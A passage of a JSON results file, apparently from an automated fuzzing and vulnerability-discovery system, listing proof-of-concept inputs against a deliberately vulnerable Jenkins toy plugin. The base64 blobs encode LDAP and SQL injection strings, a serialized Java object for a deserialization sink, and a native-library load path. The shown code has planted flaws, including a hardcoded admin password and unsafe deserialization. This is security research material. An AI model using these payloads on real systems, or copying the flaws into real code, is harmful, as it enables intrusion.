response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n48               return;\n49           }\n50   \n51           if (name.equals(\"admin\")) {\n52               if (password.equals(\"nimda\")) {\n53                   response.setContentType(\"application/json\");\n54                   response.setCharacterEncoding(\"UTF-8\");\n55                   response.getWriter().write(\"{\\\"status\\\": \\\"\" + state + \"\\\"}\");\n56                   return;\n57               } else {\n58                   logger.error(password);\n59                   response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n60                   return;\n61               }\n62           } else {\n63               logger.error(\"There are failed attempt.\");\n64               response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n65               return;\n66           }\n67       }\n",
            "cost": 0.4350200000000001,
            "harness_id": "id_3",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:46:35",
            "status": "corpus",
            "valid_path": "YES",
            "id": 7
        },
        {
            "blob": [
                "AAAAvnVzZXJuYW1lAGFkbWluKShjbj0qKSkofChjbj0qAGtleQBwYXNzd29yZA=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 60       public static void fuzzerInitialize() throws Throwable {\n 61           jenkins = Mockito.mock(Jenkins.class);\n 62   \n 63           replacer = new StaplerReplacer();\n 64           replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n 65   \n 66           rsp = Mockito.mock(ResponseImpl.class);\n 67           StringWriter sw = new StringWriter();\n 68           PrintWriter pw = new PrintWriter(sw);\n 69           when(rsp.getWriter()).thenReturn(pw);\n 70   \n 71           secretMessage = new SecretMessage();\n 72           manager = PluginManager.createDefault(jenkins);\n 73       }\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n235       void testAuthAction(ByteBuffer buf) {\n236           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n237           if (parts.length != 4) {\n238               return;\n239           }\n240   \n241           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n242           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n243           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n244           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n245   \n246           AuthAction action = new AuthAction();\n247           try {\n248               action.authenticateAsAdmin(req, rsp);\n249           } catch (IOException | NamingException e) {}\n250       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:\n190       private boolean isAdmin(DirContext dirContext, SearchControls controls, String name) throws NamingException {\n191           String searchFilter = \"(&(objectClass=inetOrgPerson)(description=admin))\";\n192           try {\n193               NamingEnumeration<SearchResult> results = dirContext.search(\"ou=users,dc=example,dc=com\", searchFilter,\n194                       controls);\n195               while (results.hasMore()) {\n196                   SearchResult result = results.next();\n197                   if (result.getAttributes().get(\"cn\").get().equals(name)) {\n198                       return true;\n199                   }\n200               }\n201           } catch (Exception e) {\n202           }\n203           return false;\n204       }\n206       @RequirePOST\n207       public void authenticateAsAdmin(StaplerRequest request, StaplerResponse response)\n208               throws IOException, NamingException {\n209           if (!request.hasParameter(\"username\") || !request.hasParameter(\"key\")) {\n210               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n211               return;\n212           }\n213           String username = request.getParameter(\"username\");\n214           String key = request.getParameter(\"key\");\n215           response.setContentType(\"application/json\");\n216           PrintWriter writer = response.getWriter();\n217   \n218           DirContext dirContext = null;\n219           try {\n220               dirContext = new InitialDirContext(getDefaultEnv());\n221               SearchControls controls = new SearchControls();\n222               controls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n223               controls.setReturningAttributes(new String[] { \"cn\" });\n224               if (!isAdmin(dirContext, controls, username)) {\n225                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n226                   return;\n227               }\n228               String searchFilter = \"(&(objectClass=inetOrgPerson)(cn=\" + username + \")(userPassword=\" + key + \"))\";\n229               NamingEnumeration<SearchResult> results = dirContext.search(\"ou=users,dc=example,dc=com\", searchFilter,\n230                       controls);\n231               if (results.hasMore()) {\n232                   writer.print(\"{\\\"status\\\": \\\"success\\\"}\");\n233               } else {\n234                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n235               }\n236           } catch (NamingException e) {\n237               response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n238           }\n239           if (dirContext != null) {\n240               try {\n241                   dirContext.close();\n242               } catch (NamingException e) {\n243               }\n244           }\n245       }\n",
            "cost": 0.4716200000000001,
            "harness_id": "id_3",
            "sanitizer": "LDAP Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:229:103",
            "status": "corpus",
            "valid_path": "YES",
            "id": 8
        },
        {
            "blob": [
                "AAAAJm5hbWUAYWRtKm4AcGFzc3dvcmQAbmltZCoA"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n206       void testStateMonitor(ByteBuffer buf) {\n207           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n208           if (parts.length != 4) {\n209               return;\n210           }\n211   \n212           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n213           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n214           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n215           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n216           try {\n217               new StateMonitor().doCheck(req, rsp);\n218           } catch (Exception e) {\n219           }\n220       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:\n35       @RequirePOST\n36       public void doCheck(StaplerRequest request, StaplerResponse response) throws Exception {\n37           if (!request.hasParameter(\"name\") || !request.hasParameter(\"password\")) {\n38               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n39               return;\n40           }\n41   \n42           String name = request.getParameter(\"name\");\n43           String password = request.getParameter(\"password\");\n44           String pattern = \"^[a-zA-Z]+$\";\n45           if (!name.matches(pattern) &&\n46                   !password.matches(pattern)) {\n47               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n48               return;\n49           }\n50   \n51           if (name.equals(\"admin\")) {\n52               if (password.equals(\"nimda\")) {\n53                   response.setContentType(\"application/json\");\n54                   response.setCharacterEncoding(\"UTF-8\");\n55                   response.getWriter().write(\"{\\\"status\\\": \\\"\" + state + \"\\\"}\");\n56                   return;\n57               } else {\n58                   logger.error(password);\n59                   response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n60                   return;\n61               }\n62           } else {\n63               logger.error(\"There are failed attempt.\");\n64               response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n65               return;\n66           }\n67       }\n",
            "cost": 0.4215249999999999,
            "harness_id": "id_3",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:45:27",
            "status": "corpus",
            "valid_path": "YES",
            "id": 9
        },
        {
            "blob": [
                "AAAAC3Byb3h5TmFtZQA4MDgwAG5vUHJveHlIb3N0AHVzZXJOYW1lAGh0dHA6Ly9qYXp6ZXIuZXhhbXBsZS5jb20="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n126       void testProxyConfiguration(ByteBuffer buf) throws Exception {\n127           Authentication a = Mockito.mock(Authentication.class);\n128           when(a.getName()).thenReturn(\"mock\");\n129   \n130           Jenkins j = Mockito.mock(Jenkins.class);\n131           doThrow(new AccessDeniedException3(a, Jenkins.ADMINISTER))\n132               .when(j)\n133               .checkPermission(Jenkins.ADMINISTER);\n134   \n135           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n136           if (parts.length != 5) {\n137               return;\n138           }\n139   \n140           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n141           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n142           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n143           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n144           try {\n145               new ProxyConfiguration.DescriptorImpl2(j).doValidateProxy(parts[4], req, rsp);\n146           } catch (AccessDeniedException3 | InterruptedException e) {}\n147       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/jenkins/core/src/main/java/hudson/ProxyConfiguration.java:\n527           @RequirePOST\n528           @Restricted(NoExternalUse.class)\n529           public FormValidation doValidateProxy(\n530               @QueryParameter(\"testUrl\") String testUrl,\n531               StaplerRequest request,\n532               StaplerResponse response) throws InterruptedException {\n533   \n534               testUrl = Util.fixEmptyAndTrim(testUrl);\n535               if (testUrl == null) {\n536                   return FormValidation.error(Messages.ProxyConfiguration_TestUrlRequired());\n537               }\n538               URI uri;\n539               try {\n540                   uri = new URI(testUrl);\n541               } catch (URISyntaxException e) {\n542                   return FormValidation.error(e, Messages.ProxyConfiguration_MalformedTestUrl(testUrl));\n543               }\n544               HttpClient.Builder builder = HttpClient.newBuilder();\n545               builder.connectTimeout(DEFAULT_CONNECT_TIMEOUT_MILLIS > 0\n546                       ? Duration.ofMillis(DEFAULT_CONNECT_TIMEOUT_MILLIS)\n547                       : Duration.ofSeconds(30));\n548   \n549               if (!request.hasParameter(\"name\")) {\n550                   return FormValidation.error(\"Missing parameter [name]\");\n551               }\n552   \n553               if (!request.hasParameter(\"port\")) {\n554                   return FormValidation.error(\"Missing parameter [port]\");\n555               }\n556   \n557               String name = request.getParameter(\"name\");\n558               int port = -1;\n559               try {\n560                   port = Integer.parseInt(request.getParameter(\"port\"));\n561               } catch (NumberFormatException e) {\n562                   return FormValidation.error(\"Invalid value for parameter [port]\");\n563               }\n564   \n565               String noProxyHost = null;\n566               if (request.hasParameter(\"noproxyhost\")) {\n567                   noProxyHost = request.getParameter(\"noproxyhost\");\n568               }\n569   \n570               String userName = null;\n571               if (request.hasParameter(\"username\")) {\n572                   userName = request.getParameter(\"username\");\n573               }\n574   \n575               Secret password = null;\n576   \n577               if (Util.fixEmptyAndTrim(name) != null &&\n578                   !isNoProxyHost(uri.getHost(), noProxyHost)) {\n579                   builder.proxy(ProxySelector.of(new InetSocketAddress(name, port)));\n580                   Authenticator authenticator = newValidationAuthenticator(userName, password != null ? password.getPlainText() : null);\n581                   builder.authenticator(authenticator);\n582               }\n583               HttpClient httpClient = builder.build();\n584               HttpRequest httpRequest;\n585               try {\n586                   httpRequest = ProxyConfiguration.newHttpRequestBuilder(uri)\n587                           .method(\"HEAD\", HttpRequest.BodyPublishers.noBody())\n588                           .build();\n589               } catch (IllegalArgumentException e) {\n590                   return FormValidation.error(e, Messages.ProxyConfiguration_MalformedTestUrl(testUrl));\n591               }\n592               try {\n593                   HttpResponse<Void> httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.discarding());\n594                   if (httpResponse.statusCode() == HttpURLConnection.HTTP_OK) {\n595                       return FormValidation.ok(Messages.ProxyConfiguration_Success());\n596                   }\n597                   return FormValidation.error(Messages.ProxyConfiguration_FailedToConnect(testUrl, httpResponse.statusCode()));\n598               } catch (IOException e) {\n599                   return FormValidation.error(e, Messages.ProxyConfiguration_FailedToConnectViaProxy(testUrl));\n600               }\n601           }\n619           private static Authenticator newValidationAuthenticator(String userName, String password) {\n620               return new Authenticator() {\n621                   @Override\n622                   protected PasswordAuthentication getPasswordAuthentication() {\n623                       return new PasswordAuthentication(\n624                               userName, Secret.fromString(password).getPlainText().toCharArray());\n625                   }\n626               };\n627           }\n",
            "cost": 0.51451,
            "harness_id": "id_3",
            "sanitizer": "Server Side Request Forgery (SSRF)",
            "sink": "src/jenkins/core/src/main/java/hudson/ProxyConfiguration.java:593:67",
            "status": "corpus",
            "valid_path": "YES",
            "id": 10
        },
        {
            "blob": [
                "AAAA0WNtZAAxAG1zZwBTR1ZzYkc4PQBsaWIAamF6emVyX2hvbmV5cG90AGZyZWVsb2FkAHRydWU="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n266       void testSecretMessage(ByteBuffer buf) {\n267           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n268           if (parts.length != 8) {\n269               return;\n270           }\n271   \n272           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n273           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n274           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n275           when(innerReq.getParameter(parts[4])).thenReturn(parts[5]);\n276           when(innerReq.getParameter(parts[6])).thenReturn(parts[7]);\n277           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n278           when(jenkins.hasPermission(Jenkins.ADMINISTER)).thenReturn(false);\n279           secretMessage.setJenkins(jenkins);\n280           try {\n281               secretMessage.doPerform(req, rsp);\n282           } catch (IOException e) {}\n283       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/SecretMessage.java:\n 58       public void doPerform(StaplerRequest request, StaplerResponse response) throws IOException {\n 59           if (!request.hasParameter(\"cmd\") ||\n 60                   !request.hasParameter(\"msg\") ||\n 61                   !request.hasParameter(\"lib\")) {\n 62               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 63               return;\n 64           }\n 65   \n 66           int cmd = 0;\n 67           try {\n 68               cmd = Integer.parseInt(request.getParameter(\"cmd\"));\n 69           } catch (NumberFormatException e) {\n 70               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 71               return;\n 72           }\n 73   \n 74           String msg = null;\n 75           try {\n 76               msg = new String(Base64.getDecoder().decode(request.getParameter(\"msg\")));\n 77           } catch (IllegalArgumentException e) {\n 78               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 79               return;\n 80           }\n 81           String lib = request.getParameter(\"lib\");\n 82           if (lib.contains(\"..\")) {\n 83               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 84               return;\n 85           }\n 86           boolean freeload = false;\n 87           boolean admin = getJenkins().hasPermission(Jenkins.ADMINISTER);\n 88           if (admin || request.hasParameter(\"freeload\")) {\n 89               freeload = Boolean.parseBoolean(request.getParameter(\"freeload\"));\n 90           }\n 91           if (Paths.get(lib).isAbsolute() && !freeload) {\n 92               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 93               return;\n 94           }\n 95   \n 96           String path = freeload ? lib : Paths.get(System.getProperty(\"user.dir\"), lib).toString();\n 97           try {\n 98               Runtime.getRuntime().load(path);\n 99               String result = null;\n100               if (cmd == 1) {\n101                   result = Base64.getEncoder().encodeToString(encrypt(msg).getBytes());\n102               } else if (cmd == 2) {\n103                   result = Base64.getEncoder().encodeToString(decrypt(msg).getBytes());\n104               }\n105   \n106               if (result == null) {\n107                   response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n108                   return;\n109               }\n110               response.setContentType(\"application/json\");\n111               response.getWriter().write(\"{\\\"result\\\": \\\"\" + result + \"\\\"}\");\n112           } catch (UnsatisfiedLinkError e) {\n113               System.out.println(e.getMessage());\n114               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n115           }\n116       }\n",
            "cost": 0.49789000000000005,
            "harness_id": "id_3",
            "sanitizer": "load arbitrary library",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/SecretMessage.java:98:39",
            "status": "corpus",
            "valid_path": "YES",
            "id": 11
        },
        {
            "blob": [
                "AAAAJSIiamF6IisiemVyIiI="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n303       void testScript(ByteBuffer buf) {\n304           when(jenkins.hasPermission(Job.CONFIGURE)).thenReturn(true);\n305           try {\n306               String whole = getRemainingAsString(buf);\n307               new Script(jenkins).doCheckScriptCompile(whole);\n308           } catch (Exception e) {}\n309           when(jenkins.hasPermission(Job.CONFIGURE)).thenReturn(false);\n310   \n311       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Script.java:\n 77       public static void secureEval(final String script, final String forbiddenInstruction, final boolean useReflection) throws Exception {\n 78           final ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\");\n 79   \n 80           final GroovySecurityManager groovySecurityManager = GroovySecurityManager.instance();\n 81           groovySecurityManager.overrideGroovyClassLoader(groovyEngine, useReflection);\n 82           groovySecurityManager.forbid(forbiddenInstruction);\n 83   \n 84           groovyEngine.eval(script);\n 85       }\n 87       @RequirePOST\n 88       public boolean doCheckScriptCompile(@QueryParameter String value) throws Exception {\n 89           if (!getJenkins().hasPermission(Job.CONFIGURE)) {\n 90               return true;\n 91           }\n 92           try {\n 93               secureEval(value, \"java.lang.System\", true);\n 94           } catch (ClassCastException | CompilationFailedException x) {\n 95               return false;\n 96           }\n 97           return true;\n 98           // Approval requirements are managed by regular stapler form validation (via doCheckScript)\n 99       }\n",
            "cost": 0.35822,
            "harness_id": "id_3",
            "sanitizer": "Script Engine Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Script.java:84:27",
            "status": "corpus",
            "valid_path": "YES",
            "id": 12
        },
        {
            "blob": [
                "AAAAkGNvdmVyYWdlX3JlcG9ydAByTzBBQlhOeUFBOXFZWFpoTG5WMGFXd3VTR0Z6YUZObGROR2ZIWmtHaHpncUF3QUFlSEIzQ0FBQUFCQUFBQUFB"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n149       void testRecoverCoverage(ByteBuffer buf) throws Exception {\n150           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n151           if (parts.length != 2)\n152               return;\n153   \n154           String reportName = parts[0];\n155           if (reportName.contains(\"..\")) {\n156               return;\n157           }\n158   \n159           String serializedObject = parts[1];\n160           if (!reportName.startsWith(\"coverage\")) {\n161               return;\n162           }\n163   \n164           byte[] target = null;\n165           try {\n166               target = java.util.Base64.getDecoder().decode(serializedObject);\n167           } catch (IllegalArgumentException e) {\n168               return;\n169           }\n170   \n171           FreeStyleBuild build = Mockito.mock(FreeStyleBuild.class);\n172           File tmpDir = Files.createTempDirectory(\"testRecoverCoverage\").toFile();\n173           try {\n174               File reportFile = new File(tmpDir, reportName);\n175               try (FileOutputStream fos = new FileOutputStream(reportFile)) {\n176                   fos.write(target);\n177               } catch (IOException e) {\n178                   return;\n179               }\n180               when(build.getRootDir()).thenReturn(tmpDir);\n181               CoverageProcessor.recoverCoverageResult(build);\n182           } finally {\n183               try {\n184                   if (tmpDir.exists()) {\n185                       FileUtils.deleteDirectory(tmpDir);\n186                   }\n187               } catch (IOException e) {}\n188           }\n189       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/CoverageProcessor.java:\n729       public static CoverageResult recoverCoverageResult(final Run<?, ?> run) throws IOException, ClassNotFoundException {\n730           File reportFile = new File(run.getRootDir(), DEFAULT_REPORT_SAVE_NAME);\n731   \n732           try (ObjectInputStream ois = new CompatibleObjectInputStream(new BufferedInputStream(new FileInputStream(reportFile)))) {\n733               return (CoverageResult) ois.readObject();\n734           }\n735       }\n",
            "cost": 0.40735999999999994,
            "harness_id": "id_3",
            "sanitizer": "Remote Code Execution",
            "sink": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/CoverageProcessor.java:733:37",
            "status": "corpus",
            "valid_path": "YES",
            "id": 13
        },
        {
            "blob": [
                "AAAAjklEACcgT1IgJzEnPScxJzsgLS0gAFBXAGlycmVsZXZhbnRwYXNzd29yZA=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 60       public static void fuzzerInitialize() throws Throwable {\n 61           jenkins = Mockito.mock(Jenkins.class);\n 62   \n 63           replacer = new StaplerReplacer();\n 64           replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n 65   \n 66           rsp = Mockito.mock(ResponseImpl.class);\n 67           StringWriter sw = new StringWriter();\n 68           PrintWriter pw = new PrintWriter(sw);\n 69           when(rsp.getWriter()).thenReturn(pw);\n 70   \n 71           secretMessage = new SecretMessage();\n 72           manager = PluginManager.createDefault(jenkins);\n 73       }\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n191       void testUserNameAction(ByteBuffer buf) {\n192           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n193           if (parts.length != 4) {\n194               return;\n195           }\n196   \n197           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n198           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n199           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n200           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n201           try {\n202               new UserNameAction().doGetName(req, rsp);\n203           } catch (IOException e) {}\n204       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       